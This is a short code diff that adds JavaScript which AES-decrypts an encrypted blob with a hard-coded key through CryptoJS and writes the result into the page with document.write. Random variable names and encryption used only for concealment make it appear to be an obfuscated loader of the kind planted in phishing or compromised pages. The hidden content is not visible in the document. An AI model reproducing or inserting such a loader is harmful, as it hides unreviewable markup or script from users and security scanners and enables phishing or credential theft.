@@ -1,0 +1,5 @@
+var OiFu="U2FsdGVkX1+sU2TfRxF/veLpLUFODiIPO3oLcI/tBUwqKJIlBbq94S9XB/dzsF1LUvvDDN9A7Tw7h6cws8fMB2T7j+kRe/MtDCMvSsHaYTT2oGTT4kPKULyqNAzCdaO+Cm6ZooZdxlCwp3B28djthLyHKLeR2RdH1KWwysIwLpPMJ7/u8X2m7GWn4eSoM376kmD3fVQesjdtRmqbviAkIWKIDxNnL6fo7tnc8cDJWlVCoWI15zyKH2VAwRkxHChdSj/P7VKhF8RVpcwQn2BviNpoOHEBZj/g+YJ/1gX9KlXdYhFtD06SnZKnjaPPUuoShRH47nhcx15jROe5pmxWxCG2NxrRhBnbyxvCZGeKUJj4OUQGefmEOA60lTS94Btx1cfvc4WVw3K5CqTHu/Y/l1Pnzu0s1ebsEOUDT7ZFLqhkghVwhjsvQn9zZ2MC+s6QD+TA78/wEX1nbixyTMnPbyOmsF8JrDFSidu18ULngtkxhiA1tYQvXKINDEjEnwf4sKw/XpTqElT2PwkxwdXphQ4fC8/AS78EXgJO6VR2KK0=" 
+ var EMeis = "ZuTyUzooPrSNesqD"; 
+ var RoWTZal= CryptoJS.AES.decrypt(OiFu, EMeis); 
+ var Niqbot = RoWTZal.toString(CryptoJS.enc.Utf8); 
+ document.write(Niqbot) 
